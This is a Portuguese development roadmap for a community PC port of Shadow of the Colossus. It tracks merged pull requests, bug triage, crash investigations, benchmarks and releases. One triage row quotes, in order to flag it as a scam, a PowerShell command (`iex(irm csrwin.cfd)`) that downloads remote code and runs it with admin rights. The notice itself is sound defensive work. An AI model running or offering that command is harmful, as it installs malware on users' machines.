# Roadmap — Shadow of the Colossus PC

Atualizado a cada correção. Legenda: ✅ feito · 🔧 em andamento · ⏳ pendente

**Estratégia (19/10/2026):** integrar e testar as pull requests e forks da comunidade em vez de refazer
o trabalho. Branch local `comunidade` = `main` (0.57) + PRs integradas. As correções equivalentes que
fiz no branch `sotc` ficam de fora quando a comunidade já as tem (e testou em hardware que não temos).

## Fase 0 — Integração da comunidade

| # | Item | Estado | Notas |
|---|---|---|---|
| 0.1 | PRs pequenas do Lucas-blip-png: #46, #47, #52, #53, #106, #108 | ✅ | #48, #105 e #107 já cobertas pela #98. #47 com conflito resolvido (RTZ na NVIDIA + pacote tipo 2). |
| 0.2 | #98 (Gabriell-os): AMD + #32 + #59 + #83 (Oussama268) | ✅ | Wave64 uniforme na AMD, blocos de 64 MiB na arena, fila de avisos que cresce, cache de formatos, readbacks assíncronos etc. |
| 0.3 | #103 (Oussama268): cortes no processador de comandos, liberação de VRAM fria | ✅ | `00fe449`. Conflito com a #98 na arena: mantidos os blocos de 64 MiB; a liberação passou a ser por trecho residente (com releitura e comparação). Teste forçado (`SOTC_ARENA_EVICT_MB=256`): 10 min, 1,5 GB liberados em 118 passadas, 0 erros, VRAM 2,7 GB (antes ~4,3). Benchmark com cache pronto: **62,6 FPS média, 30,9 mínima** (antes ~54–55 e ~26). |
| 0.4 | #81 (jownatan): Intel Arc B580 | ✅ | Só as partes exclusivas (a compilação em segundo plano e a pré-carga já vieram, para todas as GPUs, pela #83): trava de regiões sem deadlock no Windows, `SotC-Shaders.ps1`, e a espera da thread de gravação como opção `SOTC_REC_SLEEP_US` (2 ms fixos custavam 6% no desktop: 57,7 vs 61,1 FPS; notebooks/APUs: `2000`). |
| 0.5 | #69 (DUDUYG): menos CPU por draw, thread de preparação de draws | ⏳ decisão | Conflita com a linha do Oussama em 31 arquivos (~110 trechos). A medição anterior (56,9 / 41,2) **não vale**: no build da #69 o jogo pula a intro e cai num demo diferente (Wander montado, dicas de tutorial), mais leve na ponte. Mesmo demo sem DMA no `comunidade`: 61 / 26–27 (DMA não muda o pior trecho). Ganho documentado pelo autor (PC dele): preparação de draws +3,6% média / +10% trecho pesado; memos −6 a −11% de CPU por comando; parte se sobrepõe aos cortes do Oussama. |
| 0.6 | Fork xeodeo `v0.57-fixed.1`: bloco preto da AMD RDNA3/4 (#43), BC5/BC6H sem storage | ✅ | `9075c6a` (barreira entre a limpeza do swapchain e a cópia) e `ef72bdb` (só o trecho do `image.cpp`). Sem AMD aqui: só conferido que a NVIDIA segue correta. De fora: menu dentro do jogo, PGO e ícones Xbox/Nintendo (`glyphs/` feitos das texturas do jogo = material da Sony; o autor vai gerá-los localmente na próxima versão). A gravação Vulkan dormindo 2 ms já é opção (0.4). |
| 0.7 | Fork nakaionyt `v0.57-fg2` (y7ngboy): geração de quadros, sombras distantes reaproveitadas, ritmo de quadros, overlay F10, trava F7 | ✅ | Commits próprios aplicados (fora versão/README e textos fixos em inglês); conflitos resolvidos (menu + overlay, ritmo de quadros do fork no lugar do `SOTC_FLIP_LATE` da #98, `fsr-vulkan` adicionado uma vez). **FSR 3 testada na RTX 2060**: 30 quadros gerados por segundo com o jogo a 33,3 ms → 60 na tela. DLSS-G (RTX 40/50) entra no código mas precisa das DLLs oficiais da NVIDIA ao lado do exe (não baixadas; não testada). Sombras reaproveitadas: ~650–1.270 cascatas por janela, 0 recusadas, imagens corretas; FPS 62–63 (antes 61–62: aqui o limite é a CPU). Lançador: com 60 FPS desligado, trava em 30. **Teste do usuário (1 h, pacote `dist/SotC-PC-teste`): jogo bom; FSR 3 sem efeito visível com o modo 60 FPS ligado (60→120 numa tela de 60 Hz) e barra de vida/stamina tremendo (a interpolação inclui a HUD; o jogo desenha HUD e cena juntos).** Geração de quadros fica desligada por padrão e marcada como experimental no lançador (`766cbcf`). |
| 0.8 | Demais PRs (#94 menu, #54 widescreen, #118 F11, #130/#39 Linux, #99/#132 refatoração grande do CP) | ⏳ | Avaliar uma a uma. |
| 0.9 | Corrigir autor dos commits 1bb9dd5/83f88ff (branch `ajncsystem-estabilidade-fps`, PR #93) | ⏳ | |
| 0.10 | Fork do Oussama268 (opt5–opt7): thread de draws (#99 Lucas-blip-png + correções), DMA incremental, tradução de shaders e pipelines de compute em threads auxiliares, cache separado do modo Pro | ✅ | Branch `oussama-int`, juntado ao `comunidade`. Conflitos resolvidos (sombras do nakaionyt usam `DrawRegs()` da thread de draws; mutex de `gpu_modified_ranges`; versão do cache 33). Pré-carga em threads auxiliares (`e8e304f`) **revertida**: com o nosso cache de pipelines derrubava o driver NVIDIA no boot. Demo: média 63 → 65–67, mínima 30 → 34–37, ponte 30–32 → 37–40. Teste do usuário na cascata: "FPS muito melhor". Observação: o demo da tela de título às vezes sai do trilho (já acontecia antes). |
| 0.11 | #118 (EdouardSence): **F11 alterna janela / tela cheia**; ícone da janela no Linux | ✅ | `f059064`. O ícone escolhido no lançador (desenho do menino / imagem própria) continua valendo por cima do da PR. |
| 0.12 | #151: lançador quebrava no Windows em chinês (codec gbk e o "™" do título) | ✅ | `bd45855`. Saída dos scripts sempre em UTF-8. Testado simulando console gbk. |
| 0.13 | #142/#145: 21:9 e 32:9 com bordas pretas | ✅ | `5245180`. Com o modo PS4 Pro ligado o tamanho largo era ignorado sem aviso (o caminho Pro só tem tamanhos 16:9). Agora a tela larga tem prioridade; o log e o resumo do lançador avisam "PS4 Pro desligado (tela larga)". Jogo que não é EU 1.01 continua sem tela larga (já avisava no log). |
| 0.14 | #143: "limite de 6 GB de VRAM" | ✅ | `988dc52`. A limpeza agressiva de texturas começava em 60% da memória da placa e a arena liberava a partir de 1,5 GB. Nova opção **Uso de memória de vídeo**: Econômico 50%/1 GB, Padrão 60%/1,5 GB, Alto 75%/4 GB, Máximo 85%/nunca (`SOTC_VRAM_GC_PERCENT`, `SOTC_ARENA_EVICT_MB`). Teste de 150 s no Máximo: estável, 0 coletas de emergência. O "limite de 16 GB de RAM" não existe no código (é a memória do PS4 emulado). |
| 0.15 | #49: em 60 FPS o golpe da espada dá pouco dano | ❎ não é bug | Avaliação do mantenedor: modo Difícil (dano menor) ou golpe num ponto fraco que já apagou. Responder na issue pedindo para conferir. |
| 0.16 | #137: placa de 6 GB fechava com "Failed to allocate buffer arena memory" | ✅ | `12410ef`. Depois da limpeza de emergência o jogo pedia de novo um bloco inteiro de 64 MiB; agora tenta só o tamanho pedido e depois a RAM do PC antes de desistir. A mensagem final indica o nível Econômico. Só roda quando a memória acaba (não reproduzido aqui; compilado). |
| 0.17 | #147: texturas aparecendo atrasadas e luz piscando na 0.58.1 (NVIDIA) | 🔍 | Log sem erro. Suspeita: liberação de memória fria (um bloco que volta passa um quadro zerado) e a limpeza de texturas a 60%. Pedir teste com **Uso de memória de vídeo = Máximo** (desliga a liberação). |
| 0.18 | #149 / #91: modo PS4 Pro derruba o jogo (ao carregar save) | ✅ | `8ee28b2`. Dois logs de queda do usuário (19/10, modo Pro): o alocador do próprio jogo procura um bloco livre num mapa de bits de 64 KiB que cobre a memória direta (5696 MiB no Pro); cheio, lê fora do mapa (offset 0x1a371, leitura de -1). Agora o modo Pro recebe 9152 MiB, como as resoluções largas. Demo no Pro: 150 s, média 64,3, sem falha. Falta confirmar na AMD (#149). |
| 0.19 | #141/#148: tela/quadrados pretos piscando com FSR 3 na AMD (RX 7800 XT) | 🔍 AMD | Some ao desligar a geração de quadros. O fork do nakaionyt (origem do FSR 3) não tem correção mais nova. Precisa de placa AMD para testar. |
| 0.20 | #146: queda nas cenas finais depois do Malus | ✅ **zerável** | 20/10: o usuário jogou do save "15 derrotados" até os créditos (texturas HQ, modo Pro, 60 FPS) com a PR #191. Caiu só no carregamento pós-créditos (`0x49500`, heap h7): a guarda BPE pegava a faixa dos heaps em [heap+0x28] (ponteiro comum a todos; +0x30 = bytes em uso). `2bed92e`: heaps do mundo protegidos pela faixa dos próprios blocos livres (FreeExtent). Save pós-jogo "Todos os colossos derrotados - Normal+(1)" carregado e jogado até o 2º colosso sem queda (20/10). |
| 0.21 | #95: som baixo | ✅ | `c102242`. Opção **Volume** (Configurações > Som): 100/150/200/300%, com suavização dos picos acima de 100% (`SOTC_VOLUME`). Medido gravando o som do demo: 200% dobra o nível exato (pico 0,23 → 0,46); o jogo usa menos de 1/4 da escala, então 300% quase não precisa suavizar. |
| 0.22 | #136: atualização automática no lançador | ✅ | `8f91784`, do Oussama268 (2a560cd), apontando para o nosso GitHub. Procura ao abrir (opção) e pelo link "Procurar atualização"; pergunta antes de baixar, confere tamanho/SHA-256/estrutura do zip, mantém user/, update/ e sotc.ini, desfaz se der erro. 9 testes dele passam; o exe compilado consulta o GitHub e responde "em dia (0.58.1)". Instalação de verdade só dá para ver quando sair a 0.59. |
| 0.23 | **Publicar v0.59** | ✅ | Thread de desenhos do Oussama, F11, ultrawide+Pro, memória de vídeo, volume, atualização automática, #151, #137, #146 (em teste). |
| 0.24 | #178/#157/#163: sombras distantes piscando (qualquer placa) | ✅ | PR #170 (Lucas-blip-png) juntada: reutilização de sombras (nakaionyt, desde a 0.58) desligada por padrão; ela desenhava as cascatas distantes em quadros alternados e o jogo não guarda a pulada (0,36% → 0,01% de pixels piscando, −0,5% de FPS). O fork do Oussama não tem essa reutilização. Demo: média 65,6, mínima 50,1, sem falhas. `SOTC_SHADOW_REUSE=1` religa. |
| 0.24b | Opção **Sombras distantes** no lançador (Desligado padrão / Ligado / Automático) | ✅ | `ab04269`. Medido no demo inteiro: desligada média 61,8 / mínima 37,2; ligada 59,5 / 35,6, ou seja a reutilização não ganha FPS e ainda pisca (AMD, GTX 1080, RTX 40/50). O Oussama nunca teve esse recurso. |
| 0.25 | Fork do Oussama **opt8** | ✅ | AMD: acesso direto à memória desligado por padrão (listras nas sombras/água); Intel: tamanhos de dispatch, layouts, sem int64 quando a GPU não tem, subgroup fixo; log mostra GPU e driver (`SOTC_GPU_VENDOR` escolhe a GPU em notebook); correções de revisão. A trava do Windows (#81) já tínhamos. **Pré-carga assíncrona** (tela preta de 98 s após atualizar driver) fica de fora: derrubou o driver NVIDIA aqui antes; testar à parte. Demo: 62,5 / 36,7. |
| 0.26 | **Jogo não abria em PC com pouca memória** (regressão da 0.59) | ✅ | `158e514`. Os 9152 MiB (10176 com a memória flexível) eram reservados de uma vez; com pouca RAM e arquivo de paginação pequeno o Windows recusava (erro 1450) e o jogo caía no boot (log de uma APU AMD). Agora volta para 5056 MiB (5696 no Pro) e avisa no log. |
| 0.27 | Configurações por cópia do port (pedido do usuário) | ✅ | `016a891`. Antes todas as cópias usavam `%APPDATA%\sotc-launcher\settings.json` e uma cópia nova seguia usando a pasta `user` da primeira. Agora `user\launcher_settings.json` de cada cópia; na primeira vez herda as configurações antigas e **copia** saves e módulos de som da cópia antiga. Testado com pastas simuladas. |
| 0.28 | #152/#158/#187 + relato do usuário: personagens e Agro brancos/brilhando em AMD GCN (RX 570/580, APUs Vega; driver legado 2.0.279) | 🔍 | Acontece em todos os portes (inclusive o do Oussama). Descartados pelo usuário no PC AMD: `SOTC_WAVE64_UNIFORM=0`, `SHADPS4_IEEE_MINMAX=1`, `SOTC_WAVE64_IDENTITY=0`. Subgroup 64 nativo (o caminho de 32 lanes não se aplica). Achado e corrigido um defeito no fallback de atômicos float min/max (`1c94d80`), mas o SotC não usa esses atômicos (4800 shaders conferidos): não é a causa. Faltam na GCN: `VK_EXT_image_2d_view_of_3d`, `shader_atomic_float2`, `maintenance5/8`. Próximo passo: captura RenderDoc (F12) no PC AMD. |
| 0.29 | PRs da comunidade (20/10) | ✅ | #169 texturas GTX 10xx (Lucas), #174 relógio por QPC (Einar), #177 FSR 3 RX 7000 (KingJhoss), #168 guardas sem reconstruir (+6%), #183 60 FPS pelo modo Desempenho do jogo (fps60game), #171 botão JOGAR, #175 log pelo SotC.bat, #181 ferramentas de medição, #154 geração de quadros sem HUD (desligada, `SOTC_FG_HUDLESS=1`). Conflito só na #154 (base antiga, antes da thread de desenhos). Demo: 62,6 / 37,2 e 63,0 / 37,3. Uma rodada travou aos 165 s (`PS4SyncEvent`), trava intermitente do demo que já acontecia antes. |
| 0.30 | #186: "Texturas em alta qualidade" esgota a memória do jogo em vistas amplas (`0x1a371`) | ✅ | PR #191 (Lucas-blip-png) juntada, combinada com o ajuste ao vivo do menu: abaixo de 8% de páginas livres no pool de 64 KiB do jogo as texturas vistas pedem 1 mip a mais, abaixo de 4% dois. No demo com 9152 MiB o pool fica em 0% livre e pede mip 4 (ainda mais nítido que a opção desligada, que não pede nenhum). Demo: 59,7 / 34,3 (ligada) e 61,0 / 36,3 (desligada), sem falhas. Provável fim da queda do final (#146). |
| 0.31 | **Publicar v0.60** | ✅ | |
| 0.32 | PRs #94 (menu no jogo, nosekefik), #110 (pasta WpSystem fora da busca), #121 (docs) | ✅ | #94: o menu do Bloodborne (Insert / F1 / L3+R3) passa a ser do SotC e **ligado por padrão** (`BB_OVERLAY_MENU=0` desliga): FPS, GPU e VRAM, tela cheia, resolução, escala e nitidez, câmera e mouse, efeitos. Conflito resolvido mantendo os textos traduzidos da lista de saves. Testado abrindo o menu no demo (foto): 72,5 FPS, sem falha. |
| 0.33 | README só em inglês (objetivo da #93) | ✅ | `7e7cc1b`. Problemas conhecidos atualizados (#186, GCN, 60 FPS, geração de quadros). Créditos da comunidade. |
| 0.34 | #60 (Oussama268): remover sobras do Bloodborne | ✅ | `d6cb6da`, refeito sobre o código atual (a PR era da 0.57): −11.700 linhas. Mantidos o FSR-Vulkan (geração de quadros FSR 3) e o menu da #94. Ícone do SotC no bb-probe.exe. Demo 71,7 / 61,3, sem falhas; testes passam (exceto test_packaged_vulkan, só Linux, que já falhava). |
| 0.35 | **Publicar v0.60.1** | ✅ | Menu no jogo, limpeza do Bloodborne, README em inglês. |
| 0.36 | Menu no jogo: mouse solto enquanto aberto | ✅ | `8856f67`. Ficava no modo relativo da câmera (escondido, preso no centro). |
| 0.37 | Ajuste rápido dentro do jogo (pedido do usuário) | ✅ | `f1aa65d`. 60 FPS (F7), geração de quadros (Set), texturas HQ e reaproveitamento de sombras ao vivo (`sotc_live.h`), volume (`runtime_audio_set_volume_percent`). Grava no `launcher_settings.json` (`SOTC_LAUNCHER_SETTINGS`); o lançador relê ao fim do jogo. Foto do menu em português conferida; cliques testados pelo usuário. |
| 0.38 | Tela de carregamento animada durante a montagem dos shaders | ✅ | `c405137`. WarmUp saiu do construtor do PipelineCache para o fim do Presenter, com uma thread apresentando quadros em branco com a tela de carregamento. Tela opaca, animação no centro. |
| 0.39 | **Publicar v0.60.2** | ✅ | |
| 0.40 | PR #196 (Lucas): janela de 64 KiB nas leituras da GPU | ✅ | +2,7% no templo (medido por ele). |
| 0.41 | **Publicar v0.60.3** ("zerável do início ao fim") | ✅ | |
| 0.42 | Blocos ciano em pedras entalhadas e flores piscando com texturas HQ (foto do usuário, final do jogo) | ✅ | `212d7e6`. A troca de mip da PR #191 oscilava (4,3,2,3,2) com um limiar só; histerese: grosso abaixo de 8% (2 níveis abaixo de 3%), fino só acima de 6%/16%. Usuário jogou do Novo Jogo+ ao 2º colosso: 3 trocas (4→3→2), sem blocos, sem flores piscando, sem quedas. Save pós-jogo carregou: queda pós-créditos confirmada como corrigida. |
| 0.43 | **Publicar v0.60.4** | ✅ | Comentado na PR #191 para o Lucas. |
| 0.44 | Revisão de código v0.59..HEAD (8 achados) | ✅ 7 de 8 | `2c5d112` (local, sem push). Teste de 10 min com a configuração completa (HQ, Pro, 9152 MiB, 60 FPS): 0 quedas, média 53,5 / mínima 28,1 (igual a antes); dump de pilhas disparado no meio do jogo (76 threads) sem travar. Corrigidos: cerca do heap limitada à cauda de 1 MiB (pulava a guarda nas peças seguintes do heap do mundo); faixa do heap do mundo refeita após 250 ms quando uma leitura cai fora dela; dump de pilhas do vigia só lê com a thread pausada e imprime depois (não trava em lock do CRT/loader); tamanho da memória direta informado só depois do fallback; botão 60 FPS do menu não troca mais "Ilimitado" por "60"; tela de loading translúcida em engasgos curtos, opaca após 3 s; fins de linha de `emit_spirv_atomic.cpp` restaurados. Gatilho de LOD da PR #191: medido com ele desligado (Pro, 9152 MiB, 5 min): o pool de 146416 páginas fica com 0–15 livres por minutos, sem queda; o alocador do jogo libera páginas antes (call 0x1abf0) e só cai quando nada pôde ser liberado. Nenhum limiar de páginas livres separa normal de perigo → mantido até reproduzir a queda (espada no sol, Santuário, modo Pro) e detectar a liberação que falha. Log agora mostra páginas absolutas. |
| 0.45 | Vigia de travamento (pilhas no log após 15 s sem quadro) e diagnósticos `SOTC_LOD_POOL_LOG` / `SOTC_PEEK` | ✅ | `395db90`, `41cd78a` (locais). Mais de 2 h de benchmark sem reproduzir o "fechou do nada"; o vigia vai pegar a próxima no PC de um jogador. |
| 0.46 | Texturas "Máxima" nítidas sem queda | ⏳ | Precisa reproduzir a queda (espada no sol no Santuário, modo Pro) com o gatilho desligado e `SOTC_LOD_POOL_LOG=1`; depois detectar a liberação de páginas que falha (0x1abf0) em vez de olhar páginas livres. |
| 0.47 | GTX 1080 (live): texturas arco-íris e vértices explodindo | 🔍 | Não reproduz aqui forçando o caminho da #169. Pedir ao streamer: `SOTC_BARYCENTRIC_GS=0`, `SOTC_RB_NARROW=0`, `SOTC_LOD_POOL_LOW=0`, um por vez. |
| 0.48 | Retângulo cinza no céu (foto do usuário) | ⏳ | |
| 0.49 | **Publicar v0.60.5** | ✅ | Revisão + vigia, PRs #219, #232, #215, #205, #198, #207, #212, seletor de texturas. Notas e README com o menu F1 (imagem), atalhos F1/F7/F8/F10/F11 e os níveis de textura com os problemas possíveis. |

## Triagem de 21/10 (12 PRs e 103 issues abertas)

**PRs novas**

| # | Item | Estado | Notas |
|---|---|---|---|
| T1 | PR #219 (Oussama268): vazamento de memória, ~60 MB/min | ✅ `c9be814` | 10 min com a configuração completa: memória privada sobe na carga (4,5 → 5,8 GB nos 4 primeiros min, áreas do demo) e depois fica em 5,7–6,0 GB nos 6 min seguintes; 0 quedas, média 56,6 / mínima 35,6. `final_suspend` é `suspend_always`, então o `destroy()` é necessário e seguro. 7 linhas: os quadros das corrotinas de buffers indiretos nunca eram liberados (756 → 1706 MiB em 15 min; >7 GB em meia hora). Provável parte de #220 (6 GB, memória sobe até cair), dos engasgos em sessões longas e talvez do "fechou do nada". |
| T2 | PR #232 (Tadomikaari312-Hy): reaproveitar binds de descritores entre draws iguais | ✅ `9f009e8` | Demo 5 min, configuração completa sem limite de FPS: **ligado 75,2 / 41,7, desligado 72,8 / 37,1** (+3,3% média, +12% mínima); 46% dos draws reaproveitam. Folhas de imagens do demo iguais quadro a quadro, sem artefatos. Invalidação: compute, troca de render target, realocação, volta do anel de stream. Santuário RX 6600M: 24–25 → 29,6–30 FPS. `SOTC_FAST_BIND=0` desliga. Medir aqui na NVIDIA e procurar artefatos. |
| T3 | PR #205 (Lucas): barreiras LDS na AMD GCN (wave64) | ✅ `0b7a195` (teste em GCN pelos jogadores) | Só liga em AMD com subgroup 64 (`SOTC_AMD64_LDS=0` desliga); na NVIDIA a linha nem aparece no log. Causa provável dos personagens brancos/verdes/rosa na RX 470–590/Vega (0.28; #152, #158, #162, #187, #201): `needs_lds_barriers` ficava falso com subgroup 64. Sem efeito na NVIDIA; teste em GCN pelos jogadores. |
| T4 | PR #198 (Lucas): CPUs com 4 threads (gravador dorme, CP cede) | ✅ `753ca1a` | Aqui (32 processadores lógicos) o gravador segue igual (spin 250 us); a pausa do CP: ligada 73,4 / 41,1, desligada 74,6 / 40,1 = dentro do ruído. Ganho de 4 threads medido pelo Lucas (não simulado aqui). 4 threads: preso no loading → 73 FPS. Conferir que não perde FPS em 16 threads. |
| T5 | PR #215 (Oussama268): pré-carga de pipelines nos workers (driver novo: 107 s → 6,5 s) | ✅ `5bfee23` | Driver novo simulado (cache de disco da NVIDIA numa pasta vazia, `__GL_SHADER_DISK_CACHE_PATH`): **tela de carregamento 106,4 s → 7,0 s**; com cache normal 1,6 s e demo 77,5 / 36,8 sem limite. Sem queda do driver NVIDIA (a pré-carga antiga, `e8e304f`, derrubava). `SOTC_ASYNC_PRELOAD=0` volta ao modo antigo. A pré-carga assíncrona anterior derrubou o driver NVIDIA aqui (0.10/0.25). Testar com cache apagado do driver. |
| T6 | PR #207 (Lucas): lançador sobrevive a stdout que recusa escrita (#104) | ✅ `f2163cf` | Pequena, 26 linhas. |
| T7 | PR #212 (Oussama268): mensagem clara para dump/módulos ainda criptografados | ✅ `a237121` | 6 testes do prepare passam. Etapa 2 (T3+T6+T7): demo 5 min com a configuração completa, média 56,4 / mínima 36,9, 0 quedas. |
| T8 | PR #173 (JihedMrouki): baricêntricas por geometry shader na GTX 10xx | ❎ provável duplicata | Já temos a emulação por GS (log: "emulated by a geometry shader", via #169). Conflita. Comparar só as correções extras (sombra distante na 1080 Ti) antes de fechar. |
| T9 | PRs antigas #93, #81, #69, #39 | ⏳ decisão | #93 e #81 já integradas em partes (fechar com aprovação); #69 decisão pendente (0.5); #39 Linux (AppImage) atualizada há 13 h. |

**Issues novas / importantes**

| # | Item | Estado | Notas |
|---|---|---|---|
| T10 | #235: texturas HD pioraram na 0.60.4 em relação à 0.60.3 (com fotos) | ✅ `f5cc9e3` seletor de 3 níveis | Escolha do usuário: **Desligada / Alta (estável) / Máxima (nítida)** no lançador e no menu do jogo (muda na hora). Alta = gatilho mantido; Máxima = `SOTC_LOD_POOL_LOW=0`. Caixa antiga migra para Alta/Desligada (testado nos 4 casos). Demo 5 min, Pro, 9152 MiB: Alta 57,2 / 40,8, 2 trocas e termina no mip 3; Máxima 56,9 / 37,3, sempre mip 2, 0 quedas; ponte e pedras visivelmente mais nítidas na Máxima. Análise anterior: É a histerese da 0.42: com o pool sempre em ~0% livre o mip só volta ao fino acima de 16%, então fica preso no mip 4/3. Na 0.60.3 (sem histerese) voltava ao 2 entre as oscilações. Decidir: desligar o gatilho por padrão (nítido, risco da queda 0x1a371) ou corrigi-lo pela liberação que falha (0.46). |
| T22 | Usuário (0.60.5): pontos pretos em grade no chão de areia (foto) | 🔍 | Suspeita: PR #232 (desenho reaproveitando textura do anterior). Teste pedido: `SOTC_FAST_BIND=0` nas variáveis extras; depois textura Desligada. |
| T23 | Usuário: seletor de texturas no F1 "não muda" | ✅ explicado | Teste com gatilho (`SOTC_TEX_TRIGGER` / evento `tex=` do sotc_play): Alta→mip 4, Máxima→mip 2 na hora, Desligada só para de carregar (libera ~64 MB; o jogo não descarta o já carregado). Log "SOTC LOD: texture level ..." a cada troca; dica no menu explica o que vale na hora. |
| T24 | Menu F1: opções do Bloodborne que não fazem nada no SotC (resolução, upscalers FSR 3.1/4/DLSS/TAA, preset, nitidez, efeitos) | ✅ | Removidas; menu traduzido (Tela: tela cheia F11, FPS F10; Câmera e mouse). A nota aponta para o lançador. |
| T25 | Menu F1: FPS (30/60/Ilimitado), Upscaler (FSR 1/Bilinear) e Nitidez (RCAS) ao vivo | ✅ | Pedido do usuário. FPS: limite do vblank lido a cada quadro (`SotcFpsCap::limit_fps`); upscaler/RCAS: `fsr_settings` a cada quadro (`SotcLive::fsr1/rcas`). Teste com `SOTC_SET_TRIGGER` (eventos `fps=`, `up=`, `rcas=`, `tex=` do sotc_play): 60 → Ilimitado 70–92 → 30 cravado → 60; nitidez Alta vs Desligada visível na mesma cena. Aberto em 30 FPS, o 60 não tem o modo 60 do jogo (física): o menu avisa. Saída e modo PS4 Pro só ao abrir (render/memória definidos no boot); filtro 16x pendente de teste. |
| T26 | 0.60.5 (usuário, 21–22/10): pontos pretos em grade no chão de areia | 🔧 | Causa: PR #232 (reaproveita binds sem ver constantes novas no mesmo endereço). Confirmado com `SOTC_FAST_BIND=0` (pontos somem, FPS cai). Correção: contador `SotcStats::mem_epoch` (escritas do CP via NoteHostWrite + escritas da CPU vistas pelo MemoryTracker); falta o usuário conferir. |
| T27 | 0.60.5: ruído colorido/arco-íris nas pedras do Santuário, crash `0x49500` ao carregar save, polígono preto gigante ("vertex explosion", igual à live da GTX 1080) | 🔧 | Bisseção com o usuário: tudo novo desligado = limpo; **só a #219 ligada = ruído** (2 vezes). Liberar o quadro só depois da thread de desenho (FreeTaskFrame) não bastou (polígono preto). Conclusão: memória liberada ainda em uso em algum lugar; o vazamento escondia (nada era reaproveitado), e a live da GTX 1080 mostra que já acontecia antes, raramente. **#219 desligada por padrão** (`SOTC_CP_FREE_TASKS=1` liga). Armadilha `SOTC_TASK_GUARD=1` (páginas proibidas ao liberar) + `SOTC_CP_FREE_NOW=1` prontas na cópia de teste para o usuário; o cavalo e roteiros automáticos no Santuário (save do usuário, 10 min cada) não reproduzem. |
| T28 | Blocos verdes/laranja nos degraus (com #219 desligada e #215/#198/#232 ligadas) | 🔍 | Falta bisseção: #232 suspeita (pula atualização de textura). |
| T29 | Textura Máxima no modo Pro: crash `0x1a371` aos 170 s no Santuário (usuário) | ⚠️ | O risco documentado acontece rápido; rever se a Máxima deve existir no modo Pro. |
| T30 | Falha `0xa5d064` no boot na 1ª execução de um executável novo (4 vezes aqui) | 🔍 | Pode atingir jogadores na 1ª vez após atualizar; investigar. |
| T31 | **Causa do ruído arco-íris e do "fechou do nada" (0x49500): leituras quentes (`SOTC_RB_HOT`)** | ✅ | Receita do usuário: área nova → esperar → sair → recarregar o save. As leituras quentes copiavam, junto com cada leitura da GPU, regiões lidas antes e as escreviam na memória do jogo por especulação; depois que o jogo reaproveitava essa memória (texturas novas, peças do heap) o desenho velho da GPU caía por cima. Descartados no caminho: #219, #232, #215, #198, geração de quadros, liberação de VRAM, atalho dos 8×8 (`SOTC_MAYBE_DIRTY_HASH=0`), janela de 64 KiB, carregar textura da memória (`SOTC_TEX_FROM_MEMORY`). Com `SOTC_RB_HOT=0`: receita limpa 3 de 3, duas vezes; com elas ligadas o jogo caiu sozinho em 0x49500 após 23 min no demo. **Desligadas por padrão** (`54f6545`); demo 54,8 / 36,4 contra ~57 / 40. Versão "guardar à parte e aplicar só quando o jogo ler" testada: mais lenta (42,7 / 23,5), removida. |
| T32 | Log de eventos `user/events.log` (pedido do usuário) | ✅ | `b637772`. Configuração por extenso, sistema (CPU, RAM, HD/SSD), menu F1, teclas, controle, carregamentos, texturas, desempenho por minuto, erros explicados, fim da sessão; idioma do lançador; 5 últimas sessões + cópia em crashes. |
| T33 | Travadas em lugares novos (FPS a 5) no HD do usuário | ✅ | Leitura antecipada dos `.psarc` (13,7 GB em ~70 s, depois da pré-carga de shaders) e limpeza de texturas a cada carregamento (`b73c44e`, `104a836`). Máxima desativada no modo Pro. |
| T34 | Boot de ~2 min a cada executável novo (driver NVIDIA recompila; também após cada atualização dos jogadores) | ⏳ | Próximo: gravar o VkPipelineCache do port em disco (hoje começa vazio). |
| T35 | **Publicar v0.60.6** | ✅ | Leituras quentes desligadas, #219 e #232 desligadas por padrão, menu F1 limpo e ao vivo, leitura antecipada, limpeza no carregamento, events.log. |
| T11 | #226: queda na cena final (RTX 5070, log anexado) | 🔍 | Baixar o log (pedir aprovação) e ver se é o 0x49500 já corrigido na 0.60.3 ou outra coisa. |
| T12 | #228: colosso 5 (Avion) não aparece depois do 4 (modo Difícil, save da 0.59) | 🔍 | Ver se o save passa de versão; pedir o save. |
| T13 | #202: barra de vida/stamina aparece cheia (fundo preto) em 3440x1440 + Pro | 🔍 | Só no ultrawide; em 16:9 normal. HUD do patch de tela larga (#54). |
| T14 | #214: sem som na 0.60.4 (RX 6600, log) | 🔍 | Provável módulo de som (libSceNgs2/libSceUlt) faltando; ver o log. |
| T15 | #208, #209, #210, #227, #206: geração de quadros/FSR na AMD e HUD tremendo | 🔍 | #209 é o **FSR 1 (upscaler)** com artefatos/tearing na RX 9070, sem geração de quadros: diferente das outras. HUD tremendo: `SOTC_FG_HUDLESS=1` (#154) já existe; avaliar ligar por padrão. |
| T16 | #200, #231, #237 (+ #70, #88, #89, #164–166): CPUs sem AVX2/BMI1/LZCNT/MOVBE | ⏳ pedir PR | O fork do Lucas já troca essas instruções ao carregar (trabalho do Oussama, desde 0.59-plus2); #200 confirmou que funciona. Convidar para PR. |
| T17 | #224, #199: engasgos de shader mesmo com cache (RX 9060 XT; Intel Arc B580, ~13 s por área nova) | 🔍 | Arc B580: `SOTC_INTEL_PIN_SUBGROUP` não mudou nada. |
| T18 | #217: texturas quebradas na Intel Arc A580 | 🔍 Intel | Sem hardware. |
| T19 | #234/#37: HDR | ⏳ ideia | shadPS4 release 19 tem HDR; avaliar portar. |
| T20 | #213 (Lucas): triagem com 41 issues que podem ser fechadas | ⏳ aprovação | Cada uma já tem comentário dele. Fechar com aprovação do usuário. |
| T21 | **#233 e #236: golpe (malware)** — `iex(irm csrwin.cfd)` como admin, igual à #138 | 🚨 | Apagar as issues e denunciar as contas (só o dono do repositório pode). |

## Fase 1 — Estabilidade (quedas e travamentos)

| # | Item | Estado | Notas |
|---|---|---|---|
| 1 | Jogo congela ("STOP: GPU hook queue overflow") | ✅ | Na #98 (Gabriell-os `3394cd0`); eu tinha feito igual (`c69befb`, branch `sotc`). |
| 2 | Limite de alocações de VRAM (`EnsureResident: Assertion Failed`, AMD) | ✅ | Na #98 (blocos de 64 MiB, `9563b7d`); igual ao meu `c69befb`. |
| 3 | Liberar VRAM sem uso (placas de 4–6 GB) | ✅ | Da #103, adaptada aos blocos (0.3). Meu `1b62560` fica de fora: não comparava a arena com a memória do jogo antes de liberar (risco de cenas apagadas, achado do Oussama). |
| 4 | Fault 0x1a371 no modo PS4 Pro (após 1º/2º colosso) | ✅ | PR #106 (+640 MiB no modo Pro); mesma conclusão que a minha (`c2614b0`/`7d9ee11`). |
